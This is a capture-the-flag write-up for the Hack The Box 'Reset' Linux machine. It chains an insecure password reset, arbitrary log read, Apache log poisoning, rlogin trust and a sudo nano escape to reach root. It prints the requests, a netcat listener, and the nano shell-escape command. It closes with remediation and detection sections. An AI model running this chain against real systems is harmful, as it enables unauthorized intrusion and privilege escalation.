# Reset — HTB Easy, Linux

**By d4rkgunn3r / Dylan Senez — Authorized laboratory assessment**

**Attack path:** insecure password reset → admin application access → arbitrary log/file read → Apache log poisoning → web-shell execution → r-services trust to `sadm` → exposed sudo credential in tmux → sudo `nano` escape → root

> **Colour key:** **ATTACKER** blocks run on your host. **TARGET** blocks run inside the HTB machine once you have a shell.

### Reproducibility notes

- The reset password, session cookie, sudo password, and flag values are redacted.
- The retained report confirms root execution with `id`.

---

## 02 — Scope

| Field | Detail |
| --- | --- |
| Machine | Reset / HTB, Easy, Linux |
| Target IP (recorded run) | `10.129.234.130` |
| Starting access | Unauthenticated |
| Services | SSH/22, HTTP/80, rexec/512, rlogin/513, rsh/514 |
| Objective | Obtain user and root proof in the authorized HTB lab |

## 03 — External recon

**ATTACKER**

```bash
nmap -sV -sC -O -p- 10.129.234.130 -T4 --min-rate 5000
```

The unusual exposure of legacy r-services was noted early, while HTTP presented an Admin Login application.

## 04 — Insecure password reset

The reset endpoint accepted only a username and returned a newly generated password directly in the response.

```http
POST /reset_password.php HTTP/1.1
Host: 10.129.234.130
Content-Type: application/x-www-form-urlencoded

username=admin
```

Sanitized response:

```json
{
  "username": "admin",
  "new_password": "<REDACTED>",
  "timestamp": "<SERVER_TIMESTAMP>"
}
```

The returned credential allowed authentication to the Admin Dashboard.

## 05 — Arbitrary file read

The dashboard accepted a raw filesystem path in the `file` POST parameter.

```http
POST /dashboard.php HTTP/1.1
Host: 10.129.234.130
Cookie: PHPSESSID=<REDACTED>
Content-Type: application/x-www-form-urlencoded

file=%2Fvar%2Flog%2Fapache2%2Faccess.log
```

Additional paths such as `/var/log/auth.log` were readable within the web process's permissions.

## 06 — Log poisoning → code execution

**ATTACKER**

```bash
nc -lvnp 9090
```

A request placed PHP code into Apache's access log through the User-Agent header. The dashboard then loaded `/var/log/apache2/access.log`, causing the poisoned entry to execute in the web context.

The callback address is redacted as `<ATTACKER_IP>` in the public copy.

## 07 — r-services trust → sadm

Post-exploitation enumeration exposed:

```text
# /etc/hosts.equiv
- root
- local
+ sadm
```

The retained session validated remote login:

```bash
rlogin sadm@10.129.234.130
id
```

Expected context:

```text
uid=1001(sadm)
```

## 08 — Privilege escalation via sudo nano

A pre-existing tmux session exposed the `sadm` sudo workflow:

```bash
tmux attach -t sadm_session
sudo -l
```

Relevant permissions:

```text
(ALL) PASSWD: /usr/bin/nano /etc/firewall.sh
(ALL) PASSWD: /usr/bin/tail /var/log/syslog
(ALL) PASSWD: /usr/bin/tail /var/log/auth.log
```

Launch the permitted editor with the recovered lab-only password:

```bash
echo '<REDACTED>' | sudo -S /usr/bin/nano /etc/firewall.sh
```

Inside Nano:

```text
Ctrl+R
Ctrl+X
reset; bash 1>&0 2>&0
```

Verify:

```bash
whoami
id
```

## 09 — Vulnerability summary & remediation

| # | Finding | Asset | Rating |
| --- | --- | --- | --- |
| 1 | Password-reset endpoint returns privileged credentials | Web application | High |
| 2 | Dashboard accepts arbitrary filesystem paths | `dashboard.php` | High |
| 3 | Log poisoning combined with file inclusion yields RCE | Apache/PHP | Critical |
| 4 | Legacy r-services trust permits passwordless user access | rlogin/rsh | High |
| 5 | Exposed terminal history + sudo editor escape yields root | `sadm` / sudoers | Critical |

### Remediations

- Implement a token-based password-reset flow with out-of-band verification.
- Map fixed log identifiers server-side instead of accepting filesystem paths.
- Render logs as inert text and never pass them through PHP include/evaluation paths.
- Disable rsh/rlogin/rexec and remove `hosts.equiv` / `.rhosts` trust.
- Remove privileged editors from sudo policy.
- Prevent secrets from appearing in shell history, scripts, or shared terminal sessions.

## 10 — Detection opportunities

- Password resets for privileged accounts without a challenge/token event.
- Absolute paths in the `file` parameter.
- PHP syntax or shell payloads appearing in HTTP headers and access logs.
- rlogin/rsh/rexec connections.
- `sudo nano` followed by an unexpected root shell.
- Access to another user's tmux session.

## 11 — Timeline

1. Nmap exposed HTTP, SSH, and legacy r-services.
2. Password reset returned an admin credential.
3. Admin access exposed arbitrary file/log reading.
4. Apache access-log poisoning produced web-context code execution.
5. r-services trust provided a shell as `sadm`.
6. A tmux session exposed the sudo workflow.
7. The permitted Nano invocation was escaped to a root shell.
8. Root execution was verified.

**Publication note:** passwords, cookies, terminal-history secrets, and flag values have been removed from this shared copy.
